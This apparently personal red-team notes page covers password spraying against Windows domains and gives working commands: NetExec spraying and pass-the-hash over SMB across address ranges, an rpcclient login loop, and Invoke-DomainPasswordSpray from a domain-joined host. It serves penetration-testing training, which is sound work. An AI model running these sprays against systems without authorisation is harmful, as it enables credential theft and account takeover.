Password spraying is a technique that is the most commonly used nowadays to find a working credential pair.

We select a password and test it on a list of usernames. After a delay, we repeat this step with another password. ü§ñ

Many companies have some [password policy](policy.md) that may include account lookout after a certain number of failed attempts, which makes brute force impractical as we would lock all accounts.

Many [network authentication tools](/cybersecurity/red-team/s2.discovery/techniques/network/auth.md) can be used such as `hydra -C`.

## Windows Credentials Password spraying

#### Leveraging SMB

[![active_directory_enumeration_attacks](../../../../_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)

You can use [SMB](/operating-systems/networking/protocols/smb.md):

```ps
$ nxc smb IP -u wordlist -p PasswordHere
$ nxc smb IP -u wordlist -p PasswordHere | grep +
$ nxc smb --local-auth CIDR -u administrator -H hash | grep +
```

#### Leveraging RPC

[![active_directory_enumeration_attacks](../../../../_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)

A very poor but straightforward [RPC](/operating-systems/networking/protocols/rpc.md) password spraying:

```ps
$ for u in $(cat wordlist);do rpcclient -U "$u%PasswordHere" -c "getusername;quit" IP | grep Authority; done
```

#### Leveraging A Domain-joined Host

You may use [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) <small>(1.6k ‚≠ê)</small>:

```
PS> Import-Module .\DomainPasswordSpray.ps1
PS> Invoke-DomainPasswordSpray -Password PasswordHere -OutFile output.txt -ErrorAction SilentlyContinue
```
